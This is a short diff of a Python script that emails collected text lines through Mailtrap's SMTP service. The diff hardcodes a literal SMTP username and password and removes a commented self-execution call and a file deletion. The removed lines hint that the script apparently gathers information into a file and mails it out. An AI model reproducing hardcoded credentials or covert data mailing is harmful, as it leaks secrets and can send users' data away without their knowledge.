@@ -140,13 +140,11 @@ else:
     print(str(lines))
     message += str(lines)
 
+    import smtplib
+
+    # Dùng Mailtrap - chỉ cần 2 dòng này
     with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
-        server.login(YOUR_USERNAME, YOUR_PASSWORD)
+        server.login("98e63169f41627", "c8351b24cb9c23")
         server.sendmail(sender, receiver, message)
-    
 
-    #os.system("./" + os.path.basename(_file_))
-os.remove("Informations.txt")
-
-var = -34521
-print(var)
+    print("Gửi mail thành công!")
